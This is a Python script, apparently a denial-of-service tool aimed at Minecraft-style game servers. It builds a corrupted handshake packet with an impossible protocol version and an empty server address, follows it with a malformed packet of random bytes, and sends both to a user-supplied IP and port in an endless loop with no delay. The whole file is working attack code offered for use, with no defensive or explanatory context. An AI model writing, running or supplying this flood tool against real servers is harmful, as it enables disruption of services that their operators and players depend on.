import socket
import struct
import os

def varint(value):
    result = b""
    while True:
        temp = value & 0x7F
        value >>= 7
        if value:
            temp |= 0x80
        result += struct.pack("B", temp)
        if not value:
            break
    return result

def send_corrupted_handshake(SERVER_HOST, SERVER_PORT):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_HOST, SERVER_PORT))

        packet_id = varint(0x00)
        protocol_version = varint(99999999)
        server_address = b"\x00"
        server_port = struct.pack(">H", SERVER_PORT)
        next_state = varint(1)

        packet_body = packet_id + protocol_version + server_address + server_port + next_state

        packet_length = varint(len(packet_body))
        full_packet = packet_length + packet_body

        sock.sendall(full_packet)
        #print("[*] Corrupted handshake packet sent to the server.") # If you want your console getting spammed by garbage you can uncomment this
        invalid_packet_id = varint(68)
        invalid_packet_data = os.urandom(4)
        invalid_packet_length = varint(len(invalid_packet_id + invalid_packet_data))
        full_invalid_packet = invalid_packet_length + invalid_packet_id + invalid_packet_data
        sock.sendall(full_invalid_packet)
        #print("[*] Malformed follow-up packet sent to the server.") # If you want your console getting spammed by garbage you can uncomment this
        #response = sock.recv(1024) # If you want your console getting spammed by garbage you can uncomment this
        #print(f"[*] Received response: {response}") # If you want your console getting spammed by garbage you can uncomment this

    except Exception as e:
        print(f"[!] Error occurred: {e}")
    finally:
        sock.close()


if __name__ == "__main__":
    ip = input("IP: ")
    port = int(input("Port: "))
    while True:
        send_corrupted_handshake(ip, port)
